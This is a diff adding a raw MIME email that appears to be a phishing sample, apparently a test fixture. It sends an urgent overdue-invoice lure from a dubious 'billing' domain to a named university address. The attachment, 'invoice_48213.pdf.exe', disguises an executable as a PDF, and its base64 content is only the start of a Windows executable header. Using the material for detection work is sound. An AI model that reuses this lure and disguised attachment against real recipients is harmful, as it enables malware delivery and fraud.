@@ -1,0 +1,17 @@
+From: Billing Department <billing@invoice-services.top>
+To: usman@nust.edu.pk
+Subject: Invoice #48213 - Payment Overdue
+Content-Type: multipart/mixed; boundary="BOUNDARY123"
+
+--BOUNDARY123
+Content-Type: text/plain; charset="utf-8"
+
+Please find attached your overdue invoice. Immediate payment is required to avoid service interruption.
+
+--BOUNDARY123
+Content-Type: application/octet-stream; name="invoice_48213.pdf.exe"
+Content-Disposition: attachment; filename="invoice_48213.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+--BOUNDARY123--
